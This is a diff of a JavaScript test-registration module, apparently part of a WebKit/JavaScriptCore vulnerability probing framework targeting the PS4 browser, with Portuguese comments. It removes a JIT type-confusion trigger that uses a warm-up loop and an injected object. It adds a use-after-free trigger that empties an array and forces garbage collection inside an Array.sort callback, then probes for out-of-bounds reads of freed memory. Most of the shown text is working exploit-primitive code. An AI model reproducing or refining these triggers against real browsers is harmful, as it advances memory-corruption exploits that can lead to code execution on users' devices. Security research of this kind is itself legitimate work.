@@ -497,73 +497,68 @@ export const Factory = {
             }
         });
 
-       // ══════════════════════════════════════════════════════════════
-        // 10. JSC JIT (DFG/FTL) Type Confusion Optimization
-        //     Risco: CRÍTICO — Bypassa as checagens do interpretador
+ // ══════════════════════════════════════════════════════════════
+        // 10. Native C++ Callback Mutation (No-JIT OOB/Type Confusion)
+        //     C++: ArrayPrototype.cpp / std::sort
+        //     Risco: ALTO — O vetor principal para ambientes com JIT desativado.
         // ══════════════════════════════════════════════════════════════
         register({
-            id: 'JSC_JIT_TYPE_CONFUSION',
+            id: 'NATIVE_CALLBACK_MUTATION_UAF',
             category: 'CoreJS',
             risk: 'HIGH',
             description: [
-                'Faz o aquecimento (warm-up) de uma função vulnerável para forçar o',
-                'compilador JIT (DFG) a remover as checagens de tipo de array.',
-                'Após a compilação, altera o tipo (Double -> Contiguous) e aciona a função.',
-                'Retornar undefined, null ou ponteiros vazados indica vulnerabilidade no JIT.'
+                'Ataca funções nativas em C++ que executam callbacks JS (ex: Array.sort).',
+                'O algoritmo de ordenação nativo do WebKit pode fazer cache do tamanho',
+                'ou do ponteiro do Butterfly. Se o nosso callback encolher o array para 0 e acionar o GC,',
+                'quando o C++ voltar, ele vai escrever ou ler fora dos limites (OOB).'
             ].join(' '),
 
             setup: function() {
-                // A função que vamos forçar o WebKit a otimizar.
-                // Ela lê valores do array e faz matemática. O JIT vai achar que 'arr' é SEMPRE um array de Doubles.
-                this.vulnFunction = function(arr, index) {
-                    return arr[0] + arr[index]; 
-                };
-
-                this.vulnArray = [1.1, 2.2, 3.3, 4.4, 5.5];
-
-                // FASE 1: O AQUECIMENTO (Warm-up)
-                // Rodamos 10.000 vezes para o PS4 compilar this.vulnFunction em Assembly puro (sem checagem de limites/tipos).
-                for (let i = 0; i < 10000; i++) {
-                    this.vulnFunction(this.vulnArray, 1);
+                // Criamos um array grande o suficiente para não ser ordenado de forma trivial
+                this.vulnArray = [];
+                for (let i = 0; i < 50; i++) {
+                    this.vulnArray.push(1.1 + i);
                 }
-
-                // O nosso objeto malicioso que será injetado após a otimização
-                this.evilObject = { 
-                    valueOf: () => {
-                        return 1337;
-                    }
-                };
+                
+                // Variável de controle para acionar o ataque apenas uma vez
+                this.attacked = false;
             },
 
             trigger: function() {
                 try {
-                    // FASE 2: A MUTAÇÃO
-                    // O JIT confia cegamente que vulnArray só tem Doubles.
-                    // Nós injetamos um objeto, forçando o C++ a realocar o Butterfly por baixo dos panos.
-                    this.vulnArray[2] = this.evilObject;
-                    
-                    // FASE 3: O ATAQUE
-                    // Chamamos a função compilada em Assembly que não tem checagens de tipo.
-                    // Ela vai tentar ler vulnArray[3] achando que é um número (8 bytes puros),
-                    // mas o layout da memória acabou de mudar!
-                    this.vulnFunction(this.vulnArray, 3);
-                } catch(e) {}
+                    // Chamamos a função nativa C++
+                    this.vulnArray.sort((a, b) => {
+                        if (!this.attacked) {
+                            this.attacked = true;
+                            
+                            // O GATILHO: Enquanto o C++ está no meio da ordenação,
+                            // nós destruímos o array por baixo dos pés dele!
+                            this.vulnArray.length = 0;
+                            
+                            // Forçamos o GC a limpar o Butterfly antigo
+                            let trash = [];
+                            for(let i = 0; i < 20; i++) trash.push(new ArrayBuffer(1024 * 512));
+                            trash = null;
+                        }
+                        return a - b;
+                    });
+                } catch(e) {
+                    // Se o WebKit crashar aqui (TypeError ou Segfault), achamos um bug C++.
+                }
             },
 
             probe: [
-                s => s.vulnArray[3],
-                s => s.vulnArray[4],
-                // A prova absoluta: Se um valor que colocámos como número (ex: 4.4 ou 5.5)
-                // for interpretado subitamente como undefined ou null após o trigger,
-                // significa que o JIT leu a área errada da memória (Type Confusion real).
-                s => typeof s.vulnArray[3], 
-                s => typeof s.vulnArray[4]
+                s => s.vulnArray.length, // Deveria ser 0. Se o C++ forçou outro valor, temos corrupção.
+                s => s.vulnArray[0],     // Se lermos dados aqui, estamos lendo memória freed (OOB Read)
+                s => s.vulnArray[49],    // Tentativa de leitura na cauda do array destruído
+                
+                // Se o valor retornado não for 'undefined' (já que o array tem tamanho 0),
+                // o C++ ignorou a nossa mutação e leu o bloco de memória fantasma.
+                s => typeof s.vulnArray[0] 
             ],
 
             cleanup: function() {
-                this.vulnFunction = null;
                 this.vulnArray = null;
-                this.evilObject = null;
             }
         });
         return list;
